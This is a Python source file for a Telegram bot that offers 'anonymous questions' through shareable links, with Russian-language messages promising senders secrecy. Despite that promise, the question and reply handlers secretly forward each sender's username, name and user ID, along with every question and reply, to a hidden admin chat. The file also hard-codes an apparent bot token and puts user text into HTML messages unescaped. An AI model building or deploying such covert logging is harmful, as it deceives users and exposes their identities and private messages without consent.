import telebot
from telebot import types
import base64
import secrets
import sqlite3
from collections import defaultdict

TOKEN = '8430859086:AAEsdPIGXI-xG-6COFj48AUnU69yseZOnZo'
ADMIN_CHAT_ID = -1003267199569

bot = telebot.TeleBot(TOKEN)
user_states = defaultdict(lambda: None)
reply_pending = {}

conn = sqlite3.connect('anon_bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS sessions (link TEXT PRIMARY KEY, owner_id INTEGER)')
cursor.execute('CREATE TABLE IF NOT EXISTS questions (q_id TEXT PRIMARY KEY, sender_id INTEGER, owner_id INTEGER, question_text TEXT)')
conn.commit()

pending_questions = {}

def short_uuid():
    token = secrets.token_bytes(4)
    return base64.urlsafe_b64encode(token).rstrip(b'=').decode()[:8]

@bot.message_handler(commands=['start'])
def start(message):
    parts = message.text.split()
    user_id = message.chat.id
    
    if len(parts) > 1:
        handle_deep_link(message)
        return
    
    link_id = short_uuid()
    cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (link_id, user_id))
    conn.commit()
    bot_username = bot.get_me().username
    share_url = f"https://t.me/{bot_username}?start={link_id}"
    
    # HTML ссылка (работает!)
    clickable = f'<a href="{share_url}">🔗 Твоя секретная ссылка</a>'
    bot.reply_to(message, f'''🎭 <b>Анонимные вопросы!</b>

{clickable}

✨ Поделись — получишь интересные сообщения от друзей!
<i>Они не увидят, кто они для тебя 😎</i>''', parse_mode='HTML')

def handle_deep_link(message):
    user_id = message.from_user.id
    link = message.text.split(maxsplit=1)[1]
    cursor.execute("SELECT owner_id FROM sessions WHERE link=?", (link,))
    result = cursor.fetchone()
    
    if result and result[0] != user_id:
        user_states[user_id] = ('waiting_question', link)
        bot.reply_to(message, "💌 <b>Напиши вопрос анонимно</b>\n\n<i>Будет доставлен секретно! 🕵️</i>", parse_mode='HTML')
    else:
        bot.reply_to(message, "🚫 <b>Ошибка ссылки</b>\nПопробуй новую /start")

@bot.message_handler(func=lambda m: True)
def global_handler(message):
    user_id = message.from_user.id
    state = user_states[user_id]
    
    if state and state[0] == 'waiting_question':
        process_question(message)
        return
    
    if state and state[0] == 'waiting_choice':
        choice_handler(message)
        return
    
    if user_id in reply_pending:
        process_reply(message, reply_pending[user_id])
        return

def process_question(message):
    user_id = message.from_user.id
    link = user_states[user_id][1]
    cursor.execute("SELECT owner_id FROM sessions WHERE link=?", (link,))
    result = cursor.fetchone()
    
    if result:
        owner_id = result[0]
        q_id = short_uuid()
        
        cursor.execute("INSERT INTO questions VALUES (?, ?, ?, ?)", (q_id, user_id, owner_id, message.text))
        conn.commit()
        pending_questions[q_id] = user_id
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("💬 Ответить", callback_data=f"reply_{q_id}"))
        bot.send_message(owner_id, f'''🎁 <b>Новый анонимный вопрос!</b>

❓ <i>#{q_id}</i>

💭 <b>{message.text}</b>''', reply_markup=markup, parse_mode='HTML')
        
        sender_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
        sender_username = message.from_user.username or '🦸 Аноним'
        admin_log = f'''🕵️‍♂️ <b>ВОПРОС #{q_id}</b>

👤 <code>@{sender_username}</code> ({user_id})
📛 {sender_name}
👥 → <code>{owner_id}</code>

💬 <b>{message.text}</b>'''
        bot.send_message(ADMIN_CHAT_ID, admin_log, parse_mode='HTML')
        
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add("➕ Ещё один вопрос ✨", "🔄 Новая ссылка")
        bot.reply_to(message, f'''✅ <b>Вопрос улетел! 🚀</b>

➕ <i>Ещё один вопрос?</i> ✨
🔄 <i>Или новую ссылку?</i>''', reply_markup=markup, parse_mode='HTML')
        user_states[user_id] = ('waiting_choice', link)
    else:
        bot.reply_to(message, "❌ <b>Ошибка</b>")

def choice_handler(message):
    user_id = message.from_user.id
    
    if "Ещё" in message.text:
        user_states[user_id] = ('waiting_question', user_states[user_id][1])
        bot.reply_to(message, "💭 <b>Напиши следующий вопрос!</b>", parse_mode='HTML')
    else:
        user_states[user_id] = None
        bot.reply_to(message, "🔄 <b>Получи новую ссылку:</b>\n/start ✨", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
def reply_menu(call):
    q_id = call.data.split('_')[1]
    bot.answer_callback_query(call.id)
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)
    reply_pending[call.from_user.id] = q_id
    bot.reply_to(call.message, f'''✍️ <b>Ответ на вопрос #{q_id}</b>

💬 Твой ответ:''')

def process_reply(message, q_id):
    user_id = message.from_user.id
    sender_id = pending_questions.pop(q_id, None)
    del reply_pending[user_id]
    
    if sender_id:
        cursor.execute("SELECT question_text FROM questions WHERE q_id=?", (q_id,))
        result = cursor.fetchone()
        question_text = result[0] if result else "?"
        
        full_reply = f'''📩 <b>Ответ получен!</b>

❓ <i>{question_text}</i>

💬 <b>{message.text}</b>'''
        bot.send_message(sender_id, full_reply, parse_mode='HTML')
        bot.reply_to(message, f'''✅ <b>Ответ доставлен!</b>

✨ Получатель увидит свой вопрос + ответ''', parse_mode='HTML')
        
        reply_log = f'''📤 <b>ОТВЕТ #{q_id}</b>
{user_id} → {sender_id}
❓ <i>{question_text}</i>
💬 <b>{message.text}</b>'''
        bot.send_message(ADMIN_CHAT_ID, reply_log, parse_mode='HTML')
    else:
        bot.reply_to(message, "❌ <b>Вопрос не найден</b>")

print("🚀 ✨ Красивый бот с HTML ссылками!")
bot.polling(none_stop=True)
